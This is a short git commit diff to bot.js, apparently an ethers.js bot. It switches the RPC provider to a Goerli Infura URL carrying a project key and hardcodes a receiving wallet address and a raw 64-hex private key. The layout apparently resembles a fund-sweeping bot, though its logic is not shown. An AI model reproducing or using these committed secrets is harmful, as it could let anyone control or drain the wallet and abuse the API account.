65762f15729c38f1e9e698b489a526ae76001b78
Ezeagu Christopher Chukwuebuka <ezeaguccw@gmail.com>
2023-10-29 20:23:10 -0700

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,14 +1,14 @@
 const { ethers } = require('ethers')
 
-const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
+const provider = new ethers.providers.JsonRpcProvider("https://goerli.infura.io/v3/173b8ae7c69944d8ba1f6c978b35bb92")
 
 
 
 
 
-const addressReceiver = ''
+const addressReceiver = '0x3fa98bCe4c3FB148fcC0Da36711D3819C527398d'
 
-const privateKeys = [""]
+const privateKeys = ["b412ac5e610ddbadefab0d358b9c28e616821d2a7bed9282208fb1d516c0ff7b"]
 
 const bot = async =>{
 
